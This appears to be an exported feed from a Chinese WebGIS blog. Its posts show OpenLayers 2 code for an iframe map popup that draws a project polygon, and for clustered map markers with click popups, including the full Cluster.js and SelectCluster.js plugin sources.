onclick="CloseDiv('MyDiv','fade')" title="关闭详情"&gt;×&lt;/button&gt; &lt;/div&gt; &lt;iframe frameborder="0" id="iframepagemap" name="iframepage" scrolling="no" style="width: 100%;height: 100%;" src=""&gt;&lt;/iframe&gt;&lt;/div&gt; 绑定按钮的点击事件 12&lt;button type="button" class="btn btn-primary bottomBtn catMapBtn" onclick="ShowDiv('MyDiv','fade')"&gt;地图查看&lt;/button&gt; //两个参数 分别是弹出主体和遮罩背景 的id js文件中： 弹窗方法 123456789101112131415161718192021222324252627282930313233var initmap = false;//弹出隐藏层function ShowDiv(show_div,bg_div)&#123; document.getElementById(show_div).style.display='block'; document.getElementById(bg_div).style.display='block' ; var bgdiv = document.getElementById(bg_div); bgdiv.style.width = document.body.scrollWidth; // bgdiv.style.height = $(document).height(); $("#"+bg_div).height($(document).height()); var iframe = document.getElementById("iframepagemap"); if(!initmap)&#123; $("#iframepagemap").attr("src","../map/map.jsp"); var i = 0; var finishmap = setInterval(function () &#123; if (iframe.contentWindow.map!=null)&#123; map = iframe.contentWindow.map; initM= iframe.contentWindow.initM; OpenLayers = iframe.contentWindow.OpenLayers; LayerSwitcherExt = iframe.contentWindow.LayerSwitcherExt; clearInterval(finishmap); initmap = true; // 项目范围ajax LonatDetail(xmNameStr); &#125;else&#123; i++; &#125; &#125;,100) &#125;else&#123; // 项目范围ajax LonatDetail(xmNameStr); &#125;&#125;; 获取项目区域的ajax 1234567891011121314151617181920212223function LonatDetail(xmNameStr)&#123; $.ajax(&#123; url:baseurl + "Program.action", type:"POST", data:&#123; method:"progremLonat", paramts:xmNameStr, &#125;, dataType: "json", success: function(data)&#123; addPolygon(data[0]['LONLAT']); &#125;, error: function(msg)&#123; alert("ajax Error!"); &#125; &#125;)&#125;// 从后台拿到的data为：/*0: &#123;LONLAT: "[&#123;"x":100.12341032715,"y":30.675432620386&#125;,&#123;"x":12…96102,"y":55.555&#125;]"&#125;*/ 地图范围的缩放与绘制面 123456789101112131415161718192021222324252627282930313233343536// 弹出地图缩放至function addPolygon(data)&#123; data2 = eval("("+data+")"); //解析json字符串为json对象 var paths = []; // 存储坐标 for (var a = 0; a &lt; data2.length; a++) &#123; var pf = new OpenLayers.Geometry.Point( data2[a]["x"], data2[a]["y"]); // 点的数组 paths.push(pf); &#125; var stylePolyline = &#123; //画面的样式 strokeWidth : 2, strokeOpacity : 0.8, strokeColor : "blue", fillColor : "white", fillOpacity : 0.5 &#125;; // 点组织成线 var line = new OpenLayers.Geometry.LinearRing(paths); // 由线组织成面 var polygon = new OpenLayers.Geometry.Polygon(line); var featureLine = new OpenLayers.Feature.Vector(); featureLine.geometry = polygon; featureLine.style = stylePolyline; map.setLayerIndex(map.getLayer("drawLayer"), map.layers.length - 1); map.getLayer("drawLayer").removeAllFeatures(); map.getLayer("drawLayer").addFeatures(featureLine); lonlat = featureLine.geometry.getBounds().getCenterLonLat(); var zoom = map.getZoomForExtent(featureLine.geometry.getBounds()) - 1; if(zoom == 20)&#123; zoom = 19; &#125; map.setCenter(lonlat,zoom); //缩放到lonlat, zoom是范围大小 &#125;; 关闭弹窗的方法 123456//关闭弹出层function CloseDiv(show_div,bg_div)&#123; document.getElementById(show_div).style.display='none'; document.getElementById(bg_div).style.display='none';&#125;;]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>GIS</tag>
        <tag>webgis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ol2实现地图聚合功能]]></title>
    <url>%2Fol2%E5%AE%9E%E7%8E%B0%E5%9C%B0%E5%9B%BE%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[折腾了好久，终于把地图聚合给做出来了，这还得感谢杨姐姐最终的指点（不对，是帮助了很多）。下面我就直接贴代码了。 代码的主目录是这样的： cluster.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;OpenLayers Control/SelectCluster&lt;/title&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;link rel="stylesheet" href="style.css" /&gt; &lt;script type="text/javascript" src="OpenLayers.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="Cluster.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="SelectCluster.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var map, clayer, ctrl; function initMap() // 初始化地图，可以拿来放到自己对应的位置 &#123; // Nouvelle carte map = new OpenLayers.Map("map"); // OSM map.addLayer ( new OpenLayers.Layer.OSM() ); // Ajouter un controle pour les couches map.addControl(new OpenLayers.Control.LayerSwitcher()); // Centrer la carte var WGS84 = new OpenLayers.Projection('EPSG:4326'); map.setCenter(new OpenLayers.LonLat(2.424, 48.845).transform(WGS84, map.getProjectionObject()), 13); // Cluster layer's style var style = new OpenLayers.Style (&#123; pointRadius: 12, externalGraphic: "img/pins.png", backgroundGraphic: "img/pinsback.png", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: "$&#123;fcolor&#125;", //"#F0C20C", fillOpacity: 1, strokeColor: "#333", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: "$&#123;label&#125;", //labelYOffset: "$&#123;labelOffset&#125;", fontFamily: '"Luxi sans","Lucida Grande",Lucida,"Lucida Sans Unicode",sans-serif', fontSize: "$&#123;fSize&#125;", fontWeight : "bold", cursor:"pointer" &#125;, &#123; context: &#123; label: function(f) &#123; if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : ""; return f.attributes.n; &#125;, labelOffset: function(f) &#123; return (f.cluster &amp;&amp; f.cluster.length&gt;1) ? "" : -8; &#125;, fSize: function(f) &#123; return (f.cluster &amp;&amp; f.cluster.length&gt;1) ? 12 : 8; &#125;, fcolor: function(f) &#123; if (!f.cluster) return "#F0C20C"; if (f.cluster.length&lt;8) return "#AF7"; if (f.cluster.length&lt;16) return "#FD5"; return "#F97"; &#125; &#125; &#125;); // New cluster Layer clayer = new OpenLayers.Layer.Cluster ("Clusters", &#123; rendererOptions: &#123;yOrdering: true&#125;, styleMap: new OpenLayers.StyleMap (&#123; "default": style, "select": &#123; pointRadius: 18 &#125; &#125;) &#125;); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); for (var i = 0; i &lt; 200; i++) // 测试数据，替换为自己拿到的xy坐标 &#123; var r1 = Math.random(); var r2 = Math.random(); var px = b.left + (b.right-b.left) *r1 ; var py = b.bottom + (b.top-b.bottom) *r2 ; var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(px, py), &#123;n:i&#125; ); features.push(f); &#125; map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, &#123; hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) &#123; if (feature.cluster) feature = feature.cluster[0]; showStatus("selected feature "+feature.attributes.n+" ("+feature.id+")"); &#125;, onUnselect: function(feature) &#123; showStatus(""); &#125;, &#125;); map.addControl (ctrl); ctrl.activate(); &#125; function showStatus(text) &#123; document.getElementById("status").innerHTML = text; &#125; &lt;/script&gt; &lt;style&gt; body &#123; font:1em Helvetica,Arial,sans-serif; &#125; h1 &#123; color:#369; margin:0.5em 0 0.2em &#125; #tags &#123; color:#69F; font-size:0.9em; &#125; p &#123; margin: 0.5em 0; &#125; p.title &#123; color:#369; font-weight:bold; &#125; #map &#123; background:#fff; float:left; &#125; #options &#123; margin:0.5em; float:left; &#125; #options p &#123; margin:0 0 1em; &#125; #docs &#123; background:#e3e6e9; padding:0.5em; margin:0.5em 0; &#125; .olControlAttribution &#123; bottom:0; background:rgba(255,255,255,0.6); padding: 0 0.5em; &#125; #status &#123; display:block; clear:both; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body onload="initMap()"&gt; &lt;!-- DIV pour la carte --&gt; &lt;div id="map" style="width:600px; height:400px;"&gt;&lt;/div&gt; &lt;p id="status"&gt; &lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 但是由于业务需求，需要再改动一下 添加：点击地图要素，弹出其信息，点击其他区域，上一个弹窗消失： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123function loadJuhe()&#123; // Cluster layer's style var style = new OpenLayers.Style (&#123; pointRadius: 12, externalGraphic: "../../../otherlibs/ol2/img/pins.png", // 要素图标，我贴在后面，也可以用自己的 backgroundGraphic: "../../../otherlibs/ol2/img/pinsback.png", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: "$&#123;fcolor&#125;", //"#F0C20C", fillOpacity: 1, strokeColor: "#333", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: "$&#123;label&#125;", //labelYOffset: "$&#123;labelOffset&#125;", fontFamily: '"Luxi sans","Lucida Grande",Lucida,"Lucida Sans Unicode",sans-serif', fontSize: "$&#123;fSize&#125;", fontWeight : "bold", cursor:"pointer" &#125;, &#123; context: &#123; label: function(f) &#123; if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : ""; return f.attributes.n; &#125;, labelOffset: function(f) &#123; return (f.cluster &amp;&amp; f.cluster.length&gt;1) ? "" : -8; &#125;, fSize: function(f) &#123; return (f.cluster &amp;&amp; f.cluster.length&gt;1) ? 12 : 8; &#125;, fcolor: function(f) &#123; if (!f.cluster) return "#F0C20C"; if (f.cluster.length&lt;8) return "#AF7"; if (f.cluster.length&lt;16) return "#FD5"; return "#F97"; &#125; &#125; &#125;); // New cluster Layer clayer = new OpenLayers.Layer.Cluster ("Clusters", &#123; rendererOptions: &#123;yOrdering: true&#125;, styleMap: new OpenLayers.StyleMap (&#123; "default": style, "select": &#123; pointRadius: 18 &#125; &#125;) &#125;); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); // $iframes.videodata for (var i = 0; i &lt; $iframes.videodata.length; i++) //$iframes.videsdata是我从后台拿到的数据 &#123; var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point($iframes.videodata[i]['x'], $iframes.videodata[i]['y']), &#123;n:i, itemdata : $iframes.videodata[i]&#125; ); //itemdata 是每一项的数据 features.push(f); &#125; map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, &#123; hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) // 弹窗 &#123; if (feature.cluster) feature = feature.cluster[0]; ctrl.onUnselect(); var popupContentHTML=""; //弹窗的页面元素 popupContentHTML += '&lt;div id="showTradeInfo" style="width:320px;background-color:rgb(255, 255, 255);height: auto;position:relative;"&gt;'; var data = feature.data.itemdata; // 后台数据的每一项 popupContentHTML += '&lt;div style="height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;"&gt;' popupContentHTML += '&lt;label style="margin-bottom:0px;"&gt;名称&lt;/label&gt;：&lt;label style="margin-bottom:0px;font-weight:500;"&gt;'+data['name']+'&lt;/label&gt;' popupContentHTML += '&lt;/div&gt;'; popupContentHTML += '&lt;div style="height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;"&gt;' popupContentHTML += '&lt;label style="margin-bottom:0px;"&gt;地址&lt;/label&gt;：&lt;label style="margin-bottom:0px;font-weight:500;"&gt;'+data["address"]+'&lt;/label&gt;' popupContentHTML += '&lt;/div&gt;'; popupContentHTML += '&lt;/div&gt;'; var popup = new OpenLayers.Popup.CSSFramedCloud("MyFavorites", feature.geometry.getBounds().getCenterLonLat(),// 坐标 null,// popup大小 popupContentHTML,// html内容 null,// 锚点 true,// 是否显示关闭按钮 function() &#123;// 关闭弹窗触发该回调函数// specialmap.removePopup(feature.popup); feature.popup.destroy(); feature.popup = null; &#125;); popup.autoSize = true; feature.popup = popup; map.addPopup(popup); &#125;, onUnselect: function(feature) // 取消弹窗没写 &#123; for(var j=0; j&lt;map.popups.length; j++)&#123; map.removePopup(map.popups[j]); j--; &#125;// $("#clocePop").click(function()&#123;// removePopup();// &#125;); &#125;, &#125;); map.addControl (ctrl); ctrl.activate();&#125; 下面几个文件直接引用即可，直接贴出来 cluster.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231/* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr* Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/)* and the Beerware license (http://en.wikipedia.org/wiki/Beerware), * feel free to use and abuse it in your projects (the code, not the beer ;-). *//*** Class: OpenLayers.Layer.Cluster* OpenLayers.Layer.Cluster is a OpenLayers.Layer.Vector with cluster stragegy and styling** Inherits from:* - &lt;OpenLayers.Layer.Vector&gt;*/OpenLayers.Layer.Cluster = OpenLayers.Class(OpenLayers.Layer.Vector, &#123; /** * APIProperty: startegyParam * Properties for OpenLayers.Strategy.Cluster * and OpenLayers.Strategy.AnimatedCluster if included */ startegyParam: &#123; /** * APIProperty: distance * &#123;Integer&#125; Pixel distance between features that should be considered a * single cluster. Default is 45 pixels. */ distance: 45, /** * APIProperty: animationMethod for animated cluster if included * https://github.com/acanimal/AnimatedCluster */ animationMethod: OpenLayers.Easing.Expo.easeOut, /** * APIProperty: animationDuration for animated cluster if included * https://github.com/acanimal/AnimatedCluster */ animationDuration: 30 &#125;, /** * Constructor: OpenLayers.Layer.Cluster * Create a new cluster layer * * Parameters: * name - &#123;String&#125; A name for the layer * options - &#123;Object&#125; Optional object with non-default properties to set on * the layer. Use options.startegyParam to setup cluster strategy properties. * * Returns: * &#123;&lt;OpenLayers.Layer.Vector&gt;&#125; A new vector layer */ initialize: function(name, options) &#123; if (!options) options=&#123;&#125;; var self = this; // var smap = options.styleMap; if (!smap) &#123; options.styleMap = smap = new OpenLayers.StyleMap (OpenLayers.Util.extend(&#123;&#125;,OpenLayers.Feature.Vector.style)); &#125; if (!smap.styles["default"].context) smap.styles["default"].context=&#123;&#125;; // Overload a style function overrideStyle (s,f) &#123; var f0, v0; // is a value v0 = smap.styles["default"].defaultStyle[s]; // is a function if (v0 &amp;&amp; v0.match) f0 = v0.match(/^\$\&#123;(.*)\&#125;$/); if (f0) f0 = smap.styles["default"].context[f0[1]]; // Override smap.styles["default"].defaultStyle[s] = "$&#123;"+s+"&#125;"; smap.styles["default"].context[s] = function(feature) &#123; if (feature.cluster &amp;&amp; self.countFeaturesInCluster(feature)&gt;1) return f(feature); else return f0 ? f0(feature) : v0 ? v0 : ""; &#125;; smap.styles["default"].propertyStyles[s] = true; &#125; // Overload pointRadius var pointRadius = smap.styles["default"].defaultStyle.pointRadius || 3; var minRadius = smap.styles["default"].defaultStyle.minRadius || 6; var maxRadius = smap.styles["default"].defaultStyle.maxRadius || 30; var facRadius = smap.styles["default"].defaultStyle.facRadius || 1;// overrideStyle ("pointRadius", function(feature) &#123; return Math.min(minRadius + (feature.attributes.count-1)*facRadius,maxRadius);&#125;); overrideStyle ("pointRadius", function(feature) &#123; return Math.min(minRadius + (self.countFeaturesInCluster(feature)-1)*facRadius,maxRadius);&#125;); // Overload strokeWidth overrideStyle ("strokeWidth", function(feature) &#123; return 10; &#125;); // Overload strokeOpacity overrideStyle ("strokeOpacity", function(feature) &#123; return 0.5; &#125;); // Overload strokeColor var fillColor = smap.styles["default"].defaultStyle.fillColor; var fillColorFunction = null; if (fillColor &amp;&amp; fillColor.match) &#123; fillColorFunction = fillColor.match(/^\$\&#123;(.*)\&#125;$/); if (fillColorFunction) fillColorFunction = smap.styles["default"].context[fillColorFunction[1]]; &#125; overrideStyle ("strokeColor", function(feature) &#123; return fillColorFunction ? fillColorFunction(feature) : fillColor; &#125;); // Overload fillOpacity overrideStyle ("fillOpacity", function(feature) &#123; return 1; &#125;); // Overload externalGraphic overrideStyle ("externalGraphic", function(feature) &#123; return ""; &#125;); // Overload externalGraphic overrideStyle ("backgroundGraphic", function(feature) &#123; return ""; &#125;); // Overload label overrideStyle ("label", function(feature) &#123; return self.countFeaturesInCluster(feature); &#125;); var strategy; if (OpenLayers.Strategy.AnimatedCluster) strategy = OpenLayers.Strategy.AnimatedCluster else strategy = OpenLayers.Strategy.Cluster; var strategy_clusters = new strategy (&#123; distance: this.startegyParam.distance, animationMethod: this.startegyParam.animationMethod, animationDuration: this.startegyParam.animationDuration &#125;); this.strategy_clusters = strategy_clusters; if (options.strategies) options.strategies.push(strategy_clusters); else options.strategies = [strategy_clusters]; OpenLayers.Layer.Vector.prototype.initialize.apply(this, [name, options]); &#125;, /** Add new feature : the standard method remove existing features */ addFeatures: function (features) &#123; if (!this.strategy_clusters.clustering) &#123; var f = this.strategy_clusters.features; if (f) features = features.concat(f); &#125; OpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]); &#125;, /** Refresh the layer : re-calculate the clusters */ refresh: function() &#123; //this.strategy_clusters.clusters=null; this.strategy_clusters.resolution = 0; this.strategy_clusters.cluster(); &#125;, /** Compact features at the same coords in a cluster to minimze number of features */ compact: function() &#123; if (this.isCompact) return; var features = this.strategy_clusters.features; var clusters = []; var clustered; // Cluster features at the same coord for (var i=0; i&lt;features.length; i++) &#123; feature = features[i]; if(feature.geometry) &#123; clustered = false; for(var j=clusters.length-1; j&gt;=0; --j) &#123; cluster = clusters[j]; if(feature.geometry.getBounds().getCenterLonLat().equals(cluster.geometry.getBounds().getCenterLonLat())) &#123; cluster.cluster.push(feature); cluster.attributes.count += 1; clustered = true; break; &#125; &#125; if (!clustered) &#123; var center = feature.geometry.getBounds().getCenterLonLat(); var cluster = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(center.lon, center.lat), &#123;count: 1&#125; ); cluster.cluster = [feature]; clusters.push(cluster); &#125; &#125; &#125; features = new Array(); var l = clusters.length; for (var i=0; i&lt;l; i++) &#123; if (clusters[i].cluster &amp;&amp; clusters[i].attributes.count==1) features.push(clusters[i].cluster[0]); else features.push(clusters[i]); &#125; // Add the new features OpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]); this.isCompact = true; this.refresh(); &#125;, /** Count number of feature in a cluster */ countFeaturesInCluster: function(feature) &#123; if (feature.layer != this) return 1; if (feature.cluster) &#123; // Normal cluster if (!this.isCompact) return feature.attributes.count; var c = 0; // Compact Cluster &gt; count cluster of cluster for (var i=0; i&lt;feature.cluster.length; i++) &#123; c += feature.cluster[i].cluster ? feature.cluster[i].attributes.count : 1; &#125; return c; &#125; // No cluster else return 1; &#125;, /** Get the features in a cluster */ getFeaturesInCluster: function(feature) &#123; if (feature.layer != this) return [feature]; if (feature.cluster) &#123; // Normal cluster if (!this.isCompact) return feature.cluster; var f=new Array(); // Compact Cluster &gt; count cluster of cluster for (var i=0; i&lt;feature.cluster.length; i++) &#123; if (feature.cluster[i].cluster) &#123; for (k=0; k&lt;feature.cluster[i].cluster.length; k++) f.push( feature.cluster[i].cluster[k] ) &#125; else f.push( feature.cluster[i] ); &#125; return f; &#125; // No cluster else return [feature]; &#125;, /** Cluster layer */ CLASS_NAME: "OpenLayers.Layer.Cluster"&#125;); selectcluster.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297/* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr* Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/)* and the Beerware license (http://en.wikipedia.org/wiki/Beerware), * feel free to use and abuse it in your projects (the code, not the beer ;-). *//*** Class: OpenLayers.Control.SelectCluster* The SelectCluster control selects vector features from a given * cluster layer on click or hover.** Inherits from:* - &lt;OpenLayers.Control.SelectFeature&gt;*/OpenLayers.Control.SelectCluster = OpenLayers.Class(OpenLayers.Control.SelectFeature, &#123; /** * APIProperty: connect * &#123;Boolean&#125; Draw connection lines to the cluster. Default is false. */ connect: false, /** * APIProperty: animate * &#123;Boolean&#125; Play an animation. Default is false. */ animate:false, /** * APIProperty: animationDuration * &#123;Integer&#125; The number of steps to be passed to the OpenLayers.Tween.start() * method when the clusters are animated. * Default is 40. */ animationDuration: 40, /** * APIProperty: pointRadius * &#123;Number&#125; Radius of the points in the cluster. Default is 12. */ pointRadius: 12, /** * APIProperty: circleMaxObject * &#123;Integer&#125; Number of points to be drawn on a circle. Default is 10 */ circleMaxObject: 10, /** * APIProperty: spiral * &#123;Boolean&#125; Allow to draw point on a spiral when more than circleMaxObject. Default is true */ spiral: true, /** * APIProperty: maxPoint * &#123;Boolean&#125; Number of points to be drawn on a spiral. Default is 60 */ maxPoint: 60, /** * Property: animationTween * &#123;OpenLayers.Tween&#125; Tween for animation. */ animationTween: new OpenLayers.Tween(OpenLayers.Easing.Expo.easeOut), // Initialize the SelectCluster control initialize: function(layers, options) &#123; if (!layers.length) layers = [layers]; var smap = layers[0].styleMap; // Add a new layer to store selection this.selLayer = new OpenLayers.Layer.Vector("Selection", &#123; displayInLayerSwitcher: false, visibility:false, // Get the yOrdering for shadow on marker rendererOptions: layers[0].rendererOptions, styleMap: smap &#125;); // Add this layer to selection layers.push(this.selLayer); // No box selection if (options) options.box = false; OpenLayers.Control.SelectFeature.prototype.initialize.apply(this, [layers, options]); &#125;, /** * Method: setMap * Set the map property for the control. * * Parameters: * map - &#123;&lt;OpenLayers.Map&gt;&#125; */ setMap: function(map) &#123; OpenLayers.Control.SelectFeature.prototype.setMap.apply(this, arguments); map.addLayer(this.selLayer); map.events.register('movestart', this, function(e) &#123; //if(e.zoomChanged) &#123; this.unselectAll(); this.selLayer.setVisibility(false); &#125; &#125;); map.events.register('changelayer', this, function(e) &#123; if ( e.property == "visibility" &amp;&amp; e.layer != this.selLayer &amp;&amp; OpenLayers.Util.indexOf(this.layers,e.layer) &gt; -1 ) this.selLayer.setVisibility(false); &#125;); &#125;, /** * Method: select * If the feature is a cluster spread it out in selLayer. * Otherwise, do default action. * * Parameters: * feature - &#123;&lt;OpenLayers.Feature.Vector&gt;&#125; */ select: function(feature) &#123; // Don't spread twice if (feature == this.lastCluster &amp;&amp; this.selLayer.getVisibility()) return; var count=1; var layer = feature.layer; // Spread the cluster out if (feature.cluster) &#123; this.lastCluster = feature; // Clear the Layer this.selLayer.removeAllFeatures(); this.selLayer.setVisibility(true); if (layer &amp;&amp; layer.countFeaturesInCluster) count = layer.countFeaturesInCluster(feature); else count = feature.cluster.attributes.count; &#125; if (count&gt;1) &#123; // Pixel size in map unit var pix = feature.layer.map.resolution; var cluster = new Array();; if (layer &amp;&amp; layer.getFeaturesInCluster) &#123; cluster = layer.getFeaturesInCluster(feature); &#125; else cluster = feature.cluster; // Draw on a circle if (!this.spiral || cluster.length &lt;= this.circleMaxObject) &#123; var r = pix * this.pointRadius * (0.5 + cluster.length / 4); var features = new Array(); var links = new Array(); var max = Math.min(cluster.length, this.circleMaxObject); // Features on a circle for (i=0; i&lt;max; i++) &#123; // New feature var f = cluster[i].clone(); var a = 2*Math.PI*i/max; if (max==2 || max == 4) a += Math.PI/4; if (this.animate) &#123; f.dataAnimate = &#123; x0:feature.geometry.x, y0:feature.geometry.y, x1:feature.geometry.x+r*Math.sin(a), y1:feature.geometry.y+r*Math.cos(a) &#125; &#125; else f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+r*Math.sin(a), feature.geometry.y+r*Math.cos(a)); // Draw connection if (this.connect) &#123; var f2 = cluster[i].clone(); f2.geometry = new OpenLayers.Geometry.LineString ( [ f.geometry , feature.geometry ]); links.push(f2); &#125; features.push(f); &#125; if (this.connect) this.selLayer.addFeatures(links); this.selLayer.addFeatures(features); &#125; // Draw on a spiral else &#123; // Angle de depart var a = 0; var r; var d = 2*this.pointRadius; var features = new Array(); var links = new Array(); var max = Math.min (this.maxPoint, cluster.length); // Feature on a spiral for (i=0; i&lt;max; i++) &#123; // Nouveau rayon r = d/2 + d*a/(2*Math.PI); // Angle a = a + (d+0.1)/r; var dx = pix*r*Math.sin(a) var dy = pix*r*Math.cos(a) // New Feature var f = cluster[i].clone(); if (this.animate) &#123; f.dataAnimate = &#123; x0:feature.geometry.x, y0:feature.geometry.y, x1:feature.geometry.x+dx, y1:feature.geometry.y+dy &#125; &#125; else f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+dx, feature.geometry.y+dy); features.push(f); // Draw connection if (this.connect) &#123; var f2 = cluster[i].clone(); f2.geometry = new OpenLayers.Geometry.LineString ( [ f.geometry , feature.geometry ]); links.push (f2); &#125; &#125; if (this.connect) this.selLayer.addFeatures(links); this.selLayer.addFeatures(features); &#125; if (this.animate) &#123; // Animation var self = this; this.animationTween.start ( &#123;pos:0.0&#125;, &#123;pos:1.0&#125;, this.animationDuration, &#123; callbacks: &#123; eachStep: function (delta) &#123; self.doAnimation(delta); &#125;, done: function (delta) &#123; self.doAnimation(delta, true); &#125; &#125; &#125; ); &#125; &#125; else &#123; OpenLayers.Control.SelectFeature.prototype.select.apply(this, [feature]); &#125; &#125;, /** * Method: doAnimation * Calculate animation on the features in the layer. */ doAnimation: function (delta, last) &#123; var pos = delta.pos; for (var i=0; i&lt;this.selLayer.features.length; i++) &#123; var f = this.selLayer.features[i]; if (f.dataAnimate) &#123; f.geometry.x = f.dataAnimate.x0 + (f.dataAnimate.x1 - f.dataAnimate.x0) *pos; f.geometry.y = f.dataAnimate.y0 + (f.dataAnimate.y1 - f.dataAnimate.y0) *pos; &#125; if (pos==1.0) f.geometry.calculateBounds(); &#125; this.selLayer.redraw(); &#125;, /** * Method: clickoutFeature * Called on click outside a previously clicked (selected) feature. * Only responds if this.hover is false. * * Parameters: * feature - &#123;&lt;OpenLayers.Vector.Feature&gt;&#125; */ clickoutFeature: function(feature) &#123; if(!this.hover &amp;&amp; this.clickout) &#123; this.selLayer.setVisibility(false); this.unselectAll(); &#125; &#125;, /** * Method: getSelection * Return the selected features. * * Parameters: * cluster - &#123;Boolean&#125; Get cluster features or original features (pay attention original features may have inconsistent layer). Default is false. */ getSelection: function(cluster) &#123; var i, j; var sel = new Array(); for (i=0; i&lt;this.layers.length; i++) &#123; var s = this.layers[i].selectedFeatures; for (j=0; j&lt;s.length; j++) &#123; if (!cluster) &#123; if (!s[j].cluster) sel.push(s[j]); else if (s[j].cluster.length == 1) sel.push(s[j].cluster[0]); &#125; else sel.push(s[j]); &#125; &#125; return sel; &#125;, CLASS_NAME: "OpenLayers.Layer.SelectCluster"&#125;); OpenLayers.js 官方库，也可以自行下载 ，很长，但是还是放到这里吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140